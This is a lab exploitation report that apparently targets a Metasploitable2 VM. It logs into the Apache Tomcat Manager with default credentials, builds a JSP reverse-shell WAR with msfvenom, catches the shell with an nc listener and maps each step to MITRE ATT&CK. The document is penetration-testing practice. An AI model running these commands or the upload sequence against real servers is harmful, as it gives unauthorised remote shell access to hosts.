# Exploitation Report: Apache Tomcat Manager WAR Shell Upload

## Objective

Gain remote code execution on the target host (Metasploitable2) by leveraging weak credentials in the Apache Tomcat Manager and deploying a WAR-based JSP reverse shell.

---

## Summary

- **Target**: 192.168.6.3:8180
- **Exploit Vector**: Apache Tomcat Manager Interface (`/manager/html`)
- **Vulnerability Type**: Weak/default credentials + remote code execution via WAR deployment
- **Access Gained**: Reverse shell as `tomcat` user
- **Persistence**: Temporary â€” shell ends if connection is dropped

---

## Step-by-Step Exploitation

### 1. Validated Tomcat Service
- Navigated to:
http://192.168.6.3:8180/
http://192.168.6.3:8180/manager/html

- Confirmed Apache Tomcat default Manager application is exposed

### 2. Gained Access Using Default Credentials
- Used credentials:
Username: tomcat
Password: tomcat

- Successfully logged into `/manager/html`

### 3. Created Reverse Shell WAR Payload
Command used:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.6.4 LPORT=4444 -f war > shell.war

LHOST was set to Kali machine's IP (192.168.6.4)

LPORT: 4444

### 4. Started Listener

nc -lvnp 4444

### 5. Uploaded Payload to Tomcat Manager

Navigated to: WAR upload section

Uploaded: shell.war

New context appeared: /shell

### 6. Triggered Payload

Visited: http://192.168.6.3:8180/shell/

Succesfully received a reversed shell:

connect to [192.168.6.4] from (192.168.6.3)

Ran commands: 

whoami
id
uname -a # See appropriate screenshot

MITRE ATT&CK Mapping

Technique

1. Initial Access, ID: T1133, Description: External Remote Services
2. Execution, ID: T1059.004, Description: Unix Shell via reverse connection
3. Persistence, ID: T1505.003, Description: Web Shell via WAR file deployment
4. Credential Access, ID: T1078, Description: Valid Accounts (default credentials)
